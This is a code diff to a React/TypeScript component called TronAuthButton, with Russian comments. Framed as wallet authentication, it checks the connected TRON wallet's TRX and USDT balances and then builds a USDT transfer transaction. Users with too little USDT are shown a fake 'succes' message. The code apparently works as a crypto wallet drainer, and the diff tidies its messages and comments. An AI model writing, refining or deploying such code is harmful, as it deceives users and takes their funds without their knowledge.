@@ -1,6 +1,6 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { tronWeb, adapter } from './tronWallet.ts';
 
 const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
@@ -10,11 +10,6 @@ export const TronAuthButton: React.FC = () => {
   const [modalMessage, setModalMessage]     = useState<string | null>(null);
   const [loading, setLoading]               = useState(false);
   const [buttonDisabled, setButtonDisabled] = useState(false);
-
-  // Предзагрузка адаптера
-  useEffect(() => {
-    adapter.init?.().catch(() => {});
-  }, []);
 
   const disconnectAndNotify = async (message: string) => {
     setModalMessage(message);
@@ -52,22 +47,23 @@ export const TronAuthButton: React.FC = () => {
       const userAddress = await waitForAddress();
       tronWeb.setAddress(userAddress);
 
-      // Проверка TRX (минимум ~2 TRX для скорости)
+      // Проверка TRX (минимум ~2 TRX для покрытия комиссии)
       const trxBalance = await tronWeb.trx.getBalance(userAddress);
       if (trxBalance < 2_000_000) {
-        return await disconnectAndNotify('❌ Not enough TRX to cover network fees (need ~2 TRX)');
+        return await disconnectAndNotify(
+          '❌ Not enough TRX. At least 2 TRX required for network fees.'
+        );
       }
 
-      // Проверка USDT
+      // Проверка USDT баланса
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt         = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
-        // оригинальное сообщение "succes" оставляем
         return await disconnectAndNotify('succes');
       }
 
-      // Построение транзакции transfer
+      // Построение транзакции
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -98,13 +94,11 @@ export const TronAuthButton: React.FC = () => {
         msg.includes('User rejected')     ||
         msg.includes('Timeout')
       ) {
-        // тихо сброс состояния
         setLoading(false);
         setButtonDisabled(false);
         return;
       }
 
-      // оригинальное сообщение об ошибке
       await disconnectAndNotify('⚠️ Connection or transaction error');
     }
   };
